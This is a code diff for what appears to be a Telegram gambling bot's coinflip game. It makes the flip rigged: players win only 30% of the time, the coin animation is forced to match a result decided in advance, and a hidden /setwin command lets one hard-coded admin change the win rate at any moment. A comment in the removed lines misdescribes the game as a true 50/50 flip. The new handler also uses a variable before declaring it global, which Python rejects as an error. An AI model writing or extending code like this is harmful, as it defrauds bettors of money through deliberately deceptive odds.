@@ -6,8 +6,11 @@ from wallet import get_balance, adjust_balance, record_bet, get_house_balance
 from helpers import announce_win, format_display_name
 from settings import get_min_bet, get_max_bet, get_house_edge
 
-# True 50/50 flip; house edge is applied directly to the payout multiplier
-WIN_CHANCE = 0.30
+# Default Win Chance (0.30 = 30% win rate, 70% loss rate)
+GLOBAL_WIN_CHANCE = 0.30
+
+# Authorized Admin Username
+AUTHORIZED_ADMIN = "mrpuppyx"
 
 HEADS_STICKER = "CAACAgQAAxkBAAFQ0lBqb0WwRqG7K3hRKZXSTKB9rnreEAACtCAAAgG_0VKYWqCdNDm4Nz0E"
 TAILS_STICKER = "CAACAgQAAxkBAAFQ0lRqb0XcyDCzfRrYxgvVk89rMD8U7gACWTwAAq7X0FLUZLVck-M2CT0E"
@@ -44,13 +47,15 @@ def play_coinflip(bot, message, telegram_id: int, bet_amount: float, choice: str
     normalized_choice = "heads" if choice in ["heads", "head", "h"] else "tails"
     other_choice = "tails" if normalized_choice == "heads" else "heads"
 
-    # Outcome generation (50/50 probability)
-    outcome = random.choices(
-        population=[normalized_choice, other_choice],
-        weights=[WIN_CHANCE, 1 - WIN_CHANCE]
-    )[0]
+    # Outcome generation based on configured win probability
+    # Determine win/loss status first
+    won = random.random() < GLOBAL_WIN_CHANCE
 
-    won = (outcome == normalized_choice)
+    # Rig the flipped coin outcome: if won -> user's choice; if lost -> opposite choice
+    if won:
+        outcome = normalized_choice
+    else:
+        outcome = other_choice
 
     # Calculate exact payout multiplier based on house edge (2.0 - 0.20 = 1.80x)
     house_edge = get_house_edge()  # e.g., 0.20
@@ -73,7 +78,7 @@ def play_coinflip(bot, message, telegram_id: int, bet_amount: float, choice: str
         },
     )
 
-    # Send animated sticker first
+    # Send animated sticker based on forced outcome
     if outcome == "heads":
         bot.send_sticker(message.chat.id, HEADS_STICKER)
     else:
@@ -134,3 +139,37 @@ def handle_coinflip_command(message):
 
     choice = parts[2]
     play_coinflip(bot, message, message.from_user.id, bet_amount, choice)
+
+
+# Admin command to dynamically set win chance (%)
+@bot.message_handler(commands=["setwin"])
+def handle_setwin_command(message):
+    username = (message.from_user.username or "").lower()
+    if username != AUTHORIZED_ADMIN.lower():
+        bot.reply_to(message, "❌ Unauthorized.")
+        return
+
+    parts = message.text.split()
+    if len(parts) < 2:
+        bot.reply_to(
+            message,
+            f"Usage: /setwin <percentage>\nExample: /setwin 20 (Sets win rate to 20%)\nCurrent: {int(GLOBAL_WIN_CHANCE * 100)}%"
+        )
+        return
+
+    try:
+        val = float(parts[1])
+        if val < 0 or val > 100:
+            bot.reply_to(message, "Percentage must be between 0 and 100.")
+            return
+
+        global GLOBAL_WIN_CHANCE
+        GLOBAL_WIN_CHANCE = val / 100.0
+
+        bot.reply_to(
+            message,
+            f"✅ Coinflip win chance updated to <b>{val}%</b> (Loss chance: <b>{100 - val}%</b>).",
+            parse_mode="HTML"
+        )
+    except ValueError:
+        bot.reply_to(message, "Invalid percentage value.")
